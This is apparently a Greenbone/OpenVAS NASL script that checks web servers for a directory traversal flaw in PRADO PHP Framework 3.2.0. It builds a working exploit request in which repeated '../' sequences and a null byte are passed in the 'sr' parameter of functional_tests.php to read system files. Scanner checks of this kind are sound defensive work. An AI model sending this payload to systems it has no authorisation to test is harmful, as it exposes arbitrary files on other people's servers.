if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803116" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_bugtraq_id( 56677 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-11-27 15:16:12 +0530 (Tue, 27 Nov 2012)" );
	script_name( "PRADO PHP Framework 'sr' Parameter Multiple Directory Traversal Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/22937/" );
	script_xref( name: "URL", value: "http://cxsecurity.com/issue/WLB-2012110184" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/118348/ZSL-2012-5113.txt" );
	script_xref( name: "URL", value: "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5113.php" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to perform
  directory traversal attacks and read arbitrary files on the affected application." );
	script_tag( name: "affected", value: "PRADO PHP Framework version 3.2.0 (r3169)" );
	script_tag( name: "insight", value: "Input passed to the 'sr' parameter in 'functional_tests.php' and
  'functional.php'is not properly sanitised before being used to get the contents of a resource." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running PRADO PHP Framework and is prone to
  multiple directory traversal vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
webPort = http_get_port( default: 80 );
if(!http_can_host_php( port: webPort )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/prado", "/", http_cgi_dirs( port: webPort ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/";
	if(http_vuln_check( port: webPort, url: url, pattern: ">PRADO Framework for PHP", check_header: TRUE, extra_check: make_list( ">Prado Software<",
		 ">PRADO QuickStart Tutorial<",
		 ">PRADO Blog<" ) )){
		for file in keys( files ) {
			url = dir + "/tests/test_tools/functional_tests.php?sr=" + crap( data: "../", length: 3 * 15 ) + files[file] + "%00";
			if(http_vuln_check( port: webPort, url: url, check_header: TRUE, pattern: file )){
				report = http_report_vuln_url( port: webPort, url: url );
				security_message( port: webPort, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

